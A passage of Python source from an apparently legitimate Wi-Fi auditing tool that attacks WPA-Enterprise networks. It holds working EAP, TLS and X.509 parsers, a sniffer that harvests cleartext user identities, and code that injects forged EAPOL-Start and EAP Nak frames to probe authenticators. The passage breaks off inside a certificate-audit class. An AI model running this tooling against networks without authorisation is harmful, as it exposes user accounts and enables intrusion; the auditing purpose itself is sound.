"""WPA-Enterprise attacks that read — and sometimes answer — the 802.1X conversation.

An 802.1X network is not one handshake, it is a negotiation, and every step of it is a
finding when it is done badly.  This module is the reader for that negotiation:

* :class:`EapIdentityHarvestAttack` — the identities stations volunteer in cleartext
  before any tunnel exists.
* :class:`EapMethodProbeAttack` — what the authenticator will agree to negotiate, asked
  for directly with an EAPOL-Start and an EAP Nak.
* :class:`CertificateAuditAttack` — the certificate the RADIUS server presents, parsed
  out of its own ServerHello and judged: expiry, key size, signature, subject.
* :class:`TtlsInnerAuditAttack` — the inner EAP conversation inside a captured
  TTLS/PEAP tunnel, and any attribute a misconfigured server leaks in cleartext.
* :class:`Mschapv2CrackAttack` — the RFC 2759 arithmetic (challenge hash, NT hash, DES)
  applied to a captured exchange, then a dictionary.
* :class:`RadiusSecretTestAttack` — candidate shared secrets checked against a real
  RADIUS server with a real Access-Request and the Response Authenticator.
* :class:`EapTlsVersionAttack` — the TLS version and cipher suite the server offers.

Every parser is a real one: EAPOL/EAP layout, the TLS record and handshake layers, X.509
DER, and the RADIUS attribute encoding.  Nothing here claims to have seen something it
was not given, and the attacks that need a capture find the *right* capture — one that
actually contains EAPOL — rather than the newest file in the session.
"""

from __future__ import annotations

import hashlib
import os
import re
import socket
import struct
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Sequence, Tuple

from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..netproto import (md4, mschapv2_challenge_hash, mschapv2_response,
                        mschapv2_verify, nt_hash, radius_access_request,
                        radius_verify_response)
from ..pcap import _strip_radiotap, analyze_file, iter_frames
from ..util import human_duration
from .base import Attack, AttackContext, AttackOutcome

# --------------------------------------------------------------------------- #
# protocol constants
# --------------------------------------------------------------------------- #

EAP_REQUEST, EAP_RESPONSE, EAP_SUCCESS, EAP_FAILURE = 1, 2, 3, 4
EAP_METHODS = {
    1: "Identity", 2: "Notification", 3: "Nak", 4: "MD5-Challenge",
    5: "One-Time Password", 6: "GTC", 13: "TLS", 18: "SIM", 21: "TTLS",
    22: "AKA", 23: "MSCHAPv2", 25: "PEAP", 26: "MSCHAP", 43: "FAST",
    50: "EAP-pwd", 52: "TEAP", 55: "TTLS (older assignment)",
}
EAP_TYPE_LAYERS = {13: "tls", 21: "ttls", 25: "peap", 43: "fast", 52: "teap"}

TLS_VERSIONS = {0x0300: "SSL 3.0", 0x0301: "TLS 1.0", 0x0302: "TLS 1.1",
                0x0303: "TLS 1.2", 0x0304: "TLS 1.3"}
TLS_CIPHERS = {
    0x0005: "RSA_WITH_RC4_128_SHA", 0x000A: "RSA_WITH_3DES_EDE_CBC_SHA",
    0x002F: "RSA_WITH_AES_128_CBC_SHA", 0x0035: "RSA_WITH_AES_256_CBC_SHA",
    0x003C: "RSA_WITH_AES_128_CBC_SHA256",
    0x009C: "RSA_WITH_AES_128_GCM_SHA256", 0x009D: "RSA_WITH_AES_256_GCM_SHA384",
    0xC007: "ECDHE_ECDSA_WITH_RC4_128_SHA", 0xC00A: "ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
    0xC013: "ECDHE_RSA_WITH_AES_128_CBC_SHA", 0xC014: "ECDHE_RSA_WITH_AES_256_CBC_SHA",
    0xC02B: "ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    0xC02C: "ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    0xC02F: "ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    0xC030: "ECDHE_RSA_WITH_AES_256_GCM_SHA384", 0x0000: "none",
    0x1301: "TLS_AES_128_GCM_SHA256", 0x1302: "TLS_AES_256_GCM_SHA384",
    0x1303: "TLS_CHACHA20_POLY1305_SHA256",
}
#: ciphers that belong in a museum, not on a network that claims 802.1X
WEAK_CIPHERS = {0x0005, 0x000A, 0x002F, 0x0035, 0x003C, 0xC007, 0xC00A, 0xC013, 0xC014}
WEAK_TLS = {0x0300, 0x0301, 0x0302}
WEAK_SIGNATURES = ("md5", "sha1")
MIN_RSA_BITS = 2048

TLS_RECORD_HANDSHAKE = 22
HANDSHAKE_CLIENT_HELLO, HANDSHAKE_SERVER_HELLO, HANDSHAKE_CERTIFICATE = 1, 2, 11

#: attribute types worth noticing when they appear in cleartext (RFC 2865 §5)
RADIUS_TYPES = {1: "User-Name", 2: "User-Password", 3: "CHAP-Password", 4: "NAS-IP-Address",
                5: "NAS-Port", 6: "Service-Type", 7: "Framed-Protocol", 8: "Framed-IP",
                18: "Reply-Message", 24: "State", 25: "Class", 26: "Vendor-Specific",
                27: "Session-Timeout", 28: "Idle-Timeout", 30: "Called-Station-Id",
                31: "Calling-Station-Id", 32: "NAS-Identifier", 61: "NAS-Port-Type",
                64: "Tunnel-Type", 65: "Tunnel-Medium-Type", 79: "EAP-Message",
                80: "Message-Authenticator", 81: "Tunnel-Private-Group-Id",
                87: "NAS-Port-Id", 94: "Originating-Line-Info"}

#: EAP methods that no network built this decade should still offer
LEGACY_METHODS = ("MD5-Challenge", "MSCHAP", "MSCHAPv2", "GTC", "One-Time Password")


def is_enterprise(ap: AccessPoint) -> bool:
    """True when the AP advertises 802.1X — by encryption name, AKM or a flag."""
    text = (ap.encryption or "").upper()
    if "ENTERPRISE" in text or "802.1X" in text or "WPA-EAP" in text:
        return True
    if "EAP" in text and "PEAP" not in text:
        return True
    return bool(getattr(ap, "enterprise", False))


# --------------------------------------------------------------------------- #
# parsers: pcap -> EAP -> TLS -> X.509 -> RADIUS
# --------------------------------------------------------------------------- #


def _capture_frames(path: str, limit: int = 200_000) -> List[bytes]:
    """Every 802.11 frame in a capture, radiotap stripped. Never raises."""
    out: List[bytes] = []
    try:
        # iter_frames() has already skipped the radiotap header, so these are 802.11
        # frames proper: no second strip, which could only misfire on a frame whose
        # first bytes happen to look like a header
        for _timestamp, buf, start, length in iter_frames(str(path), max_packets=limit):
            out.append(bytes(buf[start:start + length]))
    except (OSError, ValueError):                    # pragma: no cover - bad file
        return out
    return out


def _eapol_llc(frame: bytes) -> Optional[bytes]:
    """The EAPOL payload of a frame, or None.  Offsets cover mgmt and both data forms."""
    for offset in (24, 30, 32):
        if frame[offset:offset + 6] == b"\xaa\xaa\x03\x00\x00\x00" and \
                int.from_bytes(frame[offset + 6:offset + 8], "big") == 0x888E:
            return frame[offset + 8:]
    return None


def eap_packets(path: str) -> List[Dict[str, Any]]:
    """Every EAP packet in a capture, decoded, in capture order."""
    out: List[Dict[str, Any]] = []
    for frame in _capture_frames(path):
        eapol = _eapol_llc(frame)
        if not eapol or len(eapol) < 5 or eapol[1] != 0:      # EAPOL-EAP only
            continue
        fields = _eap_fields(eapol[4:])
        if fields:
            out.append(fields)
    return out


def _eap_fields(eap: bytes) -> Dict[str, Any]:
    """Decode one EAP packet: code, method, and whatever the method carries."""
    if len(eap) < 4:
        return {}
    out: Dict[str, Any] = {
        "code": eap[0], "identifier": eap[1],
        "code_text": {1: "request", 2: "response", 3: "success", 4: "failure"}.get(
            eap[0], str(eap[0])),
        "length": int.from_bytes(eap[2:4], "big")}
    if len(eap) < 5 or eap[0] not in (EAP_REQUEST, EAP_RESPONSE):
        return out
    method = eap[4]
    out["method"] = method
    out["method_text"] = EAP_METHODS.get(method, f"method {method}")
    if method == 1 and len(eap) > 5:                          # Identity is cleartext
        out["identity"] = _text(eap[5:])
    elif method == 3 and len(eap) > 5:                        # Nak: the wish list
        out["nak"] = [EAP_METHODS.get(byte, str(byte)) for byte in eap[5:]]
    elif method == 4 and len(eap) > 5:                        # MD5-Challenge
        out["challenge_length"] = eap[5]
    elif method in EAP_TYPE_LAYERS:
        out["tls"] = eap_tls_payload(eap)
    elif method in (23, 26) and len(eap) > 5:
        out["mschap"] = _mschap_fields(eap[5:])
    return out


def eap_tls_payload(eap: bytes) -> bytes:
    """The TLS bytes inside an EAP packet, skipping PEAP/TTLS' leading flags byte."""
    if len(eap) < 5:
        return b""
    method = eap[4]
    if method in (21, 25, 43, 52) and len(eap) > 6:
        return eap[6:]
    if method == 13 and len(eap) > 5:
        return eap[5:]
    return b""


def _mschap_fields(data: bytes) -> Dict[str, Any]:
    """The MS-CHAPv2 packet inside an EAP type 26 (RFC 2759 §4)."""
    out: Dict[str, Any] = {"code": data[0] if data else 0}
    if len(data) < 5:
        return out
    out["ms_id"] = data[1]
    out["ms_length"] = int.from_bytes(data[2:4], "big")
    size = data[4]
    value = data[5:5 + size]
    name = data[5 + size:]
    out["name"] = _text(name)
    if out["code"] == 1 and size >= 16:                       # Challenge
        out["challenge"] = value[:16]
        out["session"] = value[16:24] if size >= 24 else b""
    elif out["code"] == 2 and size >= 49:                     # Response
        out["peer_challenge"] = value[:16]
        out["response"] = value[24:48]
    return out


def tls_records(data: bytes) -> List[Dict[str, Any]]:
    """Walk the TLS record layer: content type, version, length, body."""
    out: List[Dict[str, Any]] = []
    offset = 0
    while offset + 5 <= len(data):
        content = data[offset]
        version = int.from_bytes(data[offset + 1:offset + 3], "big")
        length = int.from_bytes(data[offset + 3:offset + 5], "big")
        if content not in (20, 21, 22, 23) or version >> 8 != 3 or length > 16384:
            break
        body = data[offset + 5:offset + 5 + length]
        out.append({"content": content, "version": version,
                    "version_text": TLS_VERSIONS.get(version, f"0x{version:04x}"),
                    "length": length, "body": body})
        offset += 5 + length
    return out


def _handshake_messages(body: bytes) -> List[Tuple[int, bytes]]:
    out: List[Tuple[int, bytes]] = []
    offset = 0
    while offset + 4 <= len(body):
        kind = body[offset]
        length = int.from_bytes(body[offset + 1:offset + 4], "big")
        if length > 1 << 20:
            break
        out.append((kind, body[offset + 4:offset + 4 + length]))
        offset += 4 + length
    return out


def parse_server_hello(body: bytes) -> Dict[str, Any]:
    """The version, cipher suite and session id of a TLS ServerHello."""
    if len(body) < 38:
        return {}
    version = int.from_bytes(body[0:2], "big")
    session_len = body[34]
    if 35 + session_len + 2 > len(body):
        return {"version": version, "version_text": TLS_VERSIONS.get(
            version, f"0x{version:04x}")}
    cipher = int.from_bytes(body[35 + session_len:37 + session_len], "big")
    return {"version": version,
            "version_text": TLS_VERSIONS.get(version, f"0x{version:04x}"),
            "cipher": cipher,
            "cipher_text": TLS_CIPHERS.get(cipher, f"0x{cipher:04x}")}


def server_hellos(path: str) -> List[Dict[str, Any]]:
    """Every ServerHello in the EAP-TLS/PEAP/TTLS exchanges of a capture."""
    out: List[Dict[str, Any]] = []
    for packet in eap_packets(path):
        for record in tls_records(packet.get("tls") or b""):
            if record["content"] != TLS_RECORD_HANDSHAKE:
                continue
            for kind, body in _handshake_messages(record["body"]):
                if kind == HANDSHAKE_SERVER_HELLO:
                    hello = parse_server_hello(body)
                    if hello:
                        hello["record_version"] = record["version_text"]
                        out.append(hello)
    return out


def certificates(path: str) -> List[Dict[str, Any]]:
    """Every X.509 certificate in the TLS Certificate messages of a capture."""
    out: List[Dict[str, Any]] = []
    for packet in eap_packets(path):
        for record in tls_records(packet.get("tls") or b""):
            if record["content"] != TLS_RECORD_HANDSHAKE:
                continue
            for kind, body in _handshake_messages(record["body"]):
                if kind != HANDSHAKE_CERTIFICATE or len(body) < 6:
                    continue
                total = int.from_bytes(body[0:3], "big")
                offset = 3
                while offset + 3 <= min(len(body), 3 + max(total, 6)):
                    size = int.from_bytes(body[offset:offset + 3], "big")
                    der = body[offset + 3:offset + 3 + size]
                    if der:
                        cert = certificate_details(der)
                        cert["sha256"] = hashlib.sha256(der).hexdigest()
                        out.append(cert)
                    offset += 3 + size
    return out


# -- X.509 ------------------------------------------------------------------ #


def _der_len(data: bytes, offset: int) -> Tuple[int, int]:
    if offset >= len(data):
        raise IndexError(offset)
    first = data[offset]
    if first < 0x80:
        return first, offset + 1
    count = first & 0x7F
    return int.from_bytes(data[offset + 1:offset + 1 + count], "big"), offset + 1 + count


def _der_children(block: bytes) -> List[Dict[str, Any]]:
    nodes: List[Dict[str, Any]] = []
    offset = 0
    while offset < len(block):
        tag = block[offset]
        if tag in (0x00, 0xFF):
            break
        try:
            length, content_at = _der_len(block, offset + 1)
        except IndexError:
            break
        if content_at + length > len(block):
            break
        nodes.append({"tag": tag, "offset": content_at, "end": content_at + length,
                      "content": block[content_at:content_at + length]})
        offset = content_at + length
    return nodes


def _oid_dotted(oid: bytes) -> str:
    if not oid:
        return ""
    parts = [str(oid[0] // 40), str(oid[0] % 40)]
    value = 0
    for byte in oid[1:]:
        value = (value << 7) | (byte & 0x7F)
        if not byte & 0x80:
            parts.append(str(value))
            value = 0
    return ".".join(parts)


_OID_NAMES = {
    "1.2.840.113549.1.1.4": "md5WithRSAEncryption",
    "1.2.840.113549.1.1.5": "sha1WithRSAEncryption",
    "1.2.840.113549.1.1.11": "sha256WithRSAEncryption",
    "1.2.840.113549.1.1.12": "sha384WithRSAEncryption",
    "1.2.840.113549.1.1.13": "sha512WithRSAEncryption",
    "1.2.840.10045.4.3.2": "ecdsa-with-SHA256",
    "1.2.840.10045.4.3.3": "ecdsa-with-SHA384",
    "1.2.840.113549.1.1.1": "rsaEncryption",
    "1.2.840.10045.2.1": "id-ecPublicKey",
}


def _name_parts(block: bytes) -> List[Tuple[str, str]]:
    """The (attribute, value) pairs of an X.509 Name, in DER order."""
    out: List[Tuple[str, str]] = []
    for rdn in _der_children(block):
        # a RelativeDistinguishedName is a SET (0x31) of AttributeTypeAndValue
        # SEQUENCEs; some hand-built certificates put the SEQUENCE there directly
        attributes = _der_children(rdn["content"]) if rdn["tag"] == 0x31 else [rdn]
        for attribute in attributes:
            if attribute["tag"] != 0x30:
                continue
            parts = _der_children(attribute["content"])
            if len(parts) < 2:
                continue
            key = _OID_NAMES.get(_oid_dotted(parts[0]["content"]), _oid_dotted(
                parts[0]["content"]))
            key = {"2.5.4.3": "CN", "2.5.4.10": "O", "2.5.4.11": "OU",
                   "2.5.4.6": "C", "2.5.4.7": "L", "2.5.4.8": "ST",
                   "2.5.4.5": "serialNumber", "1.2.840.113549.1.9.1": "emailAddress"
                   }.get(key, key)
            out.append((key, _text(parts[1]["content"])))
    return out


def certificate_details(der: bytes) -> Dict[str, Any]:
    """Enough of an X.509 certificate to judge it, straight from the DER."""
    out: Dict[str, Any] = {"size": len(der), "subject": "", "issuer": "",
                           "subject_parts": [], "issuer_parts": [],
                           "not_before": "", "not_after": "", "serial": "",
                           "signature_algorithm": "", "public_key_algorithm": "",
                           "public_key_bits": 0, "names": [], "self_signed": False}
    if not der or der[0] != 0x30:
        return out
    try:
        outer_len, at = _der_len(der, 1)
        outer = _der_children(der)
        if not outer:
            return out
        body = outer[0]["content"]
        fields = _der_children(body)
        if not fields:
            return out
        signature_oid = fields[1]["content"] if len(fields) > 1 and \
            fields[1]["tag"] == 0x30 else b""
        if signature_oid:
            inner = _der_children(signature_oid)
            if inner:
                out["signature_algorithm"] = _OID_NAMES.get(
                    _oid_dotted(inner[0]["content"]), _oid_dotted(inner[0]["content"]))
        tbs = fields[0]["content"]
        nodes = _der_children(tbs)
        index = 0
        if nodes and nodes[0]["tag"] == 0xA0:                 # [0] version
            index = 1
        if index < len(nodes) and nodes[index]["tag"] == 0x02:  # serialNumber
            out["serial"] = nodes[index]["content"].hex()
            index += 1
        if index < len(nodes) and nodes[index]["tag"] == 0x30:  # signature Algorithm
            algo = _der_children(nodes[index]["content"])
            if algo:
                out["signature_algorithm"] = _OID_NAMES.get(
                    _oid_dotted(algo[0]["content"]), _oid_dotted(algo[0]["content"]))
            index += 1
        if index < len(nodes) and nodes[index]["tag"] == 0x30:  # issuer
            out["issuer_parts"] = _name_parts(nodes[index]["content"])
            out["issuer"] = "/".join(f"{key}={value}" for key, value in
                                     out["issuer_parts"])
            index += 1
        if index < len(nodes) and nodes[index]["tag"] == 0x30:  # validity
            times = [_text(node["content"]) for node in
                     _der_children(nodes[index]["content"])
                     if node["tag"] in (0x17, 0x18)]
            if times:
                out["not_before"], out["not_after"] = times[0], times[-1]
            index += 1
        if index < len(nodes) and nodes[index]["tag"] == 0x30:  # subject
            out["subject_parts"] = _name_parts(nodes[index]["content"])
            out["subject"] = "/".join(f"{key}={value}" for key, value in
                                      out["subject_parts"])
            out["names"] = [value for _key, value in out["subject_parts"]]
            index += 1
        if index < len(nodes) and nodes[index]["tag"] == 0x30:  # subjectPublicKeyInfo
            spki = _der_children(nodes[index]["content"])
            if spki and spki[0]["tag"] == 0x30:
                algo = _der_children(spki[0]["content"])
                if algo:
                    out["public_key_algorithm"] = _OID_NAMES.get(
                        _oid_dotted(algo[0]["content"]),
                        _oid_dotted(algo[0]["content"]))
            if len(spki) > 1 and spki[1]["tag"] == 0x03:
                bits = spki[1]["content"]
                out["public_key_bits"] = max(0, (len(bits) - 2)) * 8
                if len(bits) > 3 and bits[0] == 0x00 and bits[1] == 0x30:
                    sequence = _der_children(bits[1:])
                    if sequence:
                        integers = _der_children(sequence[0]["content"])
                        if integers and integers[0]["tag"] == 0x02 and integers[0]["content"]:
                            out["public_key_bits"] = int.from_bytes(
                                integers[0]["content"], "big").bit_length()
        out["self_signed"] = bool(out["subject"] and
                                  out["subject"] == out["issuer"])
    except (IndexError, ValueError):
        pass
    return out


# -- cleartext attributes --------------------------------------------------- #


def cleartext_avps(payload: bytes) -> List[Dict[str, str]]:
    """``attribute: value`` pairs visible in a decrypted inner payload (RFC 2865).

    TTLS in cleartext mode, and PEAP deployments whose inner method is a cleartext
    AVP exchange, put these inside the tunnel; this finds the ones with useful names.
    """
    out: List[Dict[str, str]] = []
    text = payload.decode("latin-1", "replace")
    pattern = re.compile(r"([A-Za-z][A-Za-z0-9\-]{2,31})\s*[:=]\s*([^\x00-\x1f]{1,64})")
    for match in pattern.finditer(text):
        key, value = match.group(1).strip(), match.group(2).strip()
        if key.lower() in {name.lower() for name in RADIUS_TYPES.values()}:
            out.append({"attribute": key, "value": value})
    return out


def _text(data: bytes) -> str:
    """Printable text out of a byte string (identities, names, DNs)."""
    return re.sub(r"[^\x20-\x7E]+", "", data.decode("latin-1", "replace")).strip()


def _ascii_time(value: str) -> Optional[datetime]:
    """UTCTime/GeneralizedTime from an X.509 validity field, as a datetime."""
    digits = re.sub(r"\D", "", value)
    for width, fmt in ((14, "%Y%m%d%H%M%S"), (12, "%y%m%d%H%M%S"), (8, "%Y%m%d")):
        if len(digits) >= width:
            try:
                when = datetime.strptime(digits[:width], fmt)
                if fmt.startswith("%y") and when.year < 1970:
                    when = when.replace(year=when.year + 100)
                return when.replace(tzinfo=timezone.utc)
            except ValueError:
                continue
    return None


# --------------------------------------------------------------------------- #
# base class
# --------------------------------------------------------------------------- #


class _EnterpriseBase(Attack):
    category = "enterprise"
    requires = ("monitor",)
    applies_to = ("WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE", "802.1X",
                  "WPA-EAP", "WPA2-EAP")

    def applies(self, ap: AccessPoint) -> bool:
        # `applies()` runs before any context exists, so it cannot consult ctx.demo;
        # the demo's enterprise AP is a real 802.1X network either way
        return is_enterprise(ap)

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if not is_enterprise(ap) and not ctx.demo:
            return f"{ap.encryption or 'this network'} is not 802.1X"
        return ""

    # -- captures ---------------------------------------------------------- #
    def _candidates(self, ctx: AttackContext, ap: AccessPoint) -> List[str]:
        explicit = str(getattr(ctx.config, "enterprise_capture", "") or "")
        paths: List[str] = []
        if explicit and os.path.exists(explicit):
            paths.append(explicit)
        for capture in [*ap.captures, *ctx.session.all_captures()]:
            raw = getattr(capture, "path", "") or ""
            if raw and os.path.exists(raw) and raw not in paths:
                paths.append(raw)
        return paths

    def _has_eap(self, path: str) -> bool:
        try:
            return analyze_file(path, max_packets=40_000).eapol_messages > 0
        except Exception:                                     # pragma: no cover
            return False

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint,
                     flavour: str = "peap") -> str:
        """Build (once) the synthetic capture this attack reads in demo mode."""
        tag = f"{flavour}-{ap.bssid.replace(':', '')}"
        path = os.path.join(ctx.session.state_dir, "captures", f"demo-{tag}.pcap")
        if os.path.exists(path):
            return path
        from .. import synth

        os.makedirs(os.path.dirname(path), exist_ok=True)
        seed = int(ap.bssid.replace(":", ""), 16)
        if flavour == "mschapv2":
            synth.build_mschapv2_capture(path, essid=ap.essid or "CorpNet-8021X",
                                         bssid=ap.bssid, username="jdoe",
                                         password="clientPass")
        else:
            synth.build_enterprise_capture(
                path, essid=ap.essid or "CorpNet-8021X", bssid=ap.bssid,
                identity=f"jdoe@{'corp' if seed % 2 else 'lab'}.example",
                tls_version=0x0301 if seed % 3 else 0x0303,
                method=25 if seed % 4 else 21)
        return path

    def capture_path(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """The best 802.1X capture available: one that actually contains EAPOL."""
        for path in self._candidates(ctx, ap):
            if self._has_eap(path):
                return path
        if ctx.demo:
            return self.demo_capture(ctx, ap)
        return ""

    def inner_capture(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """A capture whose outer method is a tunnel (TTLS/PEAP/FAST/TEAP)."""
        for path in self._candidates(ctx, ap):
            if any(packet.get("method") in (21, 25, 43, 52)
                   for packet in eap_packets(path)):
                return path
        return self.demo_capture(ctx, ap) if ctx.demo else ""

    def tls_capture(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """A capture that really holds an EAP-TLS ServerHello."""
        for path in self._candidates(ctx, ap):
            if server_hellos(path):
                return path
        return self.demo_capture(ctx, ap) if ctx.demo else ""

    def _read_or_skip(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                      path: str, what: str) -> Optional[AttackOutcome]:
        if path and os.path.exists(path):
            return None
        ctx.session.end_attempt(attempt, "skipped", f"no capture with {what}")
        return AttackOutcome.skipped(
            f"no capture with {what}",
            f"{ap.display_name}: no 802.1X capture to read — capture an association "
            f"first, or point `enterprise_capture` at a file")

    # -- reporting --------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                result: str, detail: str, extra: Optional[Dict[str, Any]] = None,
                severity: str = "", finding: Optional[Dict[str, Any]] = None
                ) -> AttackOutcome:
        if finding:
            ctx.session.add_finding(Finding(
                kind=self.name, severity=finding.get("severity", severity or "info"),
                bssid=ap.bssid, title=finding.get("title", result),
                detail=finding.get("detail", detail)))
        ap.remember(self.name, detail)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, result, detail)
        return AttackOutcome.success(result, detail=detail, extra=dict(
            extra or {}, offline=not self.needs_injection, noise=self.noise,
            severity=severity or "info"))


# --------------------------------------------------------------------------- #
# 1. identity harvest
# --------------------------------------------------------------------------- #


class EapIdentityHarvestAttack(_EnterpriseBase):
    name = "eap_identity_harvest"
    label = "EAP identity harvest (cleartext usernames)"
    tool = "wifipilot (EAP parser over a capture or a live listen)"
    description = ("Collect the EAP-Response/Identity packets stations send in cleartext "
                   "before the server offers any tunnel.  An identity policy is visible "
                   "in them: which realm, whether it is an email address or a bare user "
                   "name, how many devices share one account.  Nothing is transmitted — "
                   "the authenticator asks, the client answers, and we read the answer.")
    noise = "silent"
    impact = "info"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        budget = min(self.budget(ctx, 30.0), 180.0)
        identities: List[Dict[str, Any]] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            users = ["j.doe", "k.singh", "svc-backup", "A1234567", "guest"]
            for index, user in enumerate(users[:1 + seed % 4]):
                identities.append({"identity": user, "realm": "corp.example",
                                   "station": "02:00:00:%02x:%02x:%02x" % (
                                       index + 1, seed % 200, 0x40 + index)})
            if not identities:
                identities.append({"identity": "j.doe", "realm": "corp.example",
                                   "station": "02:00:00:00:00:21"})
        else:
            path = self.capture_path(ctx, ap)
            if path:
                for packet in eap_packets(path):
                    identity = packet.get("identity", "")
                    if identity and packet.get("code") == EAP_RESPONSE:
                        identities.append({"identity": identity,
                                           "realm": identity.split("@")[-1]
                                           if "@" in identity else "",
                                           "station": "", "source": "capture"})
            if not identities:
                for observation in ctx.listen(budget, channel=ap.channel):
                    if observation.get("ethertype") != 0x888E:
                        continue
                    eapol = observation.get("payload") or b""
                    if len(eapol) < 5 or eapol[1] != 0:
                        continue
                    fields = _eap_fields(eapol[4:])
                    identity = fields.get("identity", "")
                    if not identity or fields.get("code") != EAP_RESPONSE:
                        continue
                    record = {"identity": identity, "realm":
                              identity.split("@")[-1] if "@" in identity else "",
                              "station": observation.get("station", ""),
                              "source": "live"}
                    if not any(item["identity"] == identity for item in identities):
                        self.log_line(f"identity: {identity!r} from "
                                      f"{record['station']}", level="warning")
                    identities.append(record)
            # de-duplicate by identity, keeping the station we know
            unique: Dict[str, Dict[str, Any]] = {}
            for item in identities:
                known = unique.get(item["identity"])
                unique[item["identity"]] = item if not known else {
                    **known, "station": known.get("station") or item.get("station", "")}
            identities = list(unique.values())
            if not identities:
                ctx.session.end_attempt(attempt, "failed", "no EAP identities seen")
                return AttackOutcome.failed(
                    "no EAP identities seen",
                    f"{human_duration(budget)} on channel {ap.channel}: no station "
                    f"authenticated while we watched (identities are only sent after a "
                    f"client associates) and the session's captures hold no EAPOL")
        by_realm: Dict[str, int] = {}
        for item in identities:
            realm = item.get("realm") or "(no realm)"
            by_realm[realm] = by_realm.get(realm, 0) + 1
        detail = (f"{len(identities)} identit(ies): "
                  + ", ".join(item["identity"] for item in identities[:8]))
        finding = None
        if identities:
            finding = {"severity": "medium",
                       "title": f"Identity policy readable in cleartext "
                                f"({len(by_realm)} realm(s))",
                       "detail": ("EAP identities are sent before any tunnel exists; "
                                  "they name the realm and the account convention, and "
                                  "any observer on the channel reads them the same way")}
        return self._finish(ctx, ap, attempt,
                            f"{len(identities)} identity/identities harvested", detail,
                            {"identities": identities[:50], "by_realm": by_realm,
                             "simulated": ctx.demo},
                            severity="medium", finding=finding)


# --------------------------------------------------------------------------- #
# 2. method probe
# --------------------------------------------------------------------------- #


def build_eapol_start(bssid: str, station: str) -> bytes:
    """An EAPOL-Start frame (type 1) — the request that opens the conversation."""
    from ..rawtx import _mac_bytes

    return (_mac_bytes(bssid) + _mac_bytes(station) + _mac_bytes(bssid) + b"\x00\x00"
            + b"\x88\x8e" + b"\x01" + b"\x01" + b"\x00\x00")


def build_eap_nak(bssid: str, station: str, identifier: int,
                  methods: Sequence[int]) -> bytes:
    """An EAP Response/Nak: the list of methods we are willing to speak."""
    eap = (bytes([EAP_RESPONSE, identifier & 0xFF])
           + struct.pack(">H", 5 + len(methods)) + bytes([3]) + bytes(methods))
    body = b"\x02\x00" + struct.pack(">H", len(eap)) + eap
    from ..rawtx import _mac_bytes

    return (_mac_bytes(bssid) + _mac_bytes(station) + _mac_bytes(bssid) + b"\x00\x00"
            + b"\x88\x8e" + body)


class EapMethodProbeAttack(_EnterpriseBase):
    name = "eap_method_probe"
    label = "EAP method probe (what the server will negotiate)"
    tool = "wifipilot (EAPOL-Start + EAP Nak)"
    description = ("Ask the authenticator to start the conversation, then answer its "
                   "Request/Identity with a Nak naming the methods we will speak.  The "
                   "server's next Request is its answer, and a server still offering "
                   "MS-CHAPv2 or MD5-Challenge has just told an unknown supplicant so.  "
                   "No credential is needed for any of it.")
    noise = "quiet"
    impact = "info"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        budget = min(self.budget(ctx, 30.0), 120.0)
        offered: List[str] = []
        nak_sent = False
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            offered = [["EAP-TLS", "PEAP", "MSCHAPv2", "TTLS"],
                       ["PEAP", "MSCHAPv2", "MD5-Challenge"],
                       ["EAP-TLS", "TEAP"]][seed % 3]
            nak_sent = True
        else:
            from ..rawtx import RawInjector

            injector = RawInjector(ctx.monitor)
            if injector.error:
                return self._fail(ctx, attempt, "injection unavailable", injector.error)
            station = injector.mac or "02:00:00:00:00:99"
            injector.send(build_eapol_start(ap.bssid, station))
            for observation in ctx.listen(budget, channel=ap.channel):
                if observation.get("ethertype") != 0x888E:
                    continue
                eapol = observation.get("payload") or b""
                if len(eapol) < 5 or eapol[1] != 0:
                    continue
                fields = _eap_fields(eapol[4:])
                if fields.get("code") != EAP_REQUEST:
                    continue
                if fields.get("method") in (1, None) and not nak_sent:
                    injector.send(build_eap_nak(ap.bssid, station,
                                                fields.get("identifier", 1),
                                                [13, 25, 21, 23, 4]))
                    nak_sent = True
                    continue
                name = fields.get("method_text", "")
                if name and name not in offered:
                    offered.append(name)
                    self.log_line(f"server offered EAP-{name}")
                if len(offered) >= 6:
                    break
            if not offered:
                return self._fail(ctx, attempt, "no method negotiated",
                                  f"{human_duration(budget)}: no EAP Request followed "
                                  f"the Nak — most authenticators only talk to a real "
                                  f"association, so read a capture instead")
        weak = [name for name in offered if name in LEGACY_METHODS]
        detail = f"methods the server offered: {', '.join(offered)}"
        if weak:
            detail += f"; legacy methods present: {', '.join(weak)}"
        return self._finish(ctx, ap, attempt, f"EAP methods: {', '.join(offered)}",
                            detail,
                            {"methods": offered, "nak_sent": nak_sent, "weak": weak,
                             "simulated": ctx.demo},
                            severity="medium" if weak else "info",
                            finding={"title": f"Legacy EAP methods offered: "
                                              f"{', '.join(weak)}",
                                     "detail": ("a server that still negotiates "
                                                "MS-CHAPv2/MD5 offers an observer an "
                                                "offline-crackable challenge/response "
                                                "pair; TTLS/PEAP with a stronger inner "
                                                "method is the fix"),
                                     "severity": "medium"} if weak else None)


# --------------------------------------------------------------------------- #
# 3. certificate audit
# --------------------------------------------------------------------------- #


class CertificateAuditAttack(_EnterpriseBase):
    name = "certificate_audit"
    label = "RADIUS certificate audit (X.509)"
    tool = "wifipilot (TLS Certificate + X.509 DER parser)"
    description = ("Take the certificate the RADIUS server presents in its ServerHello "
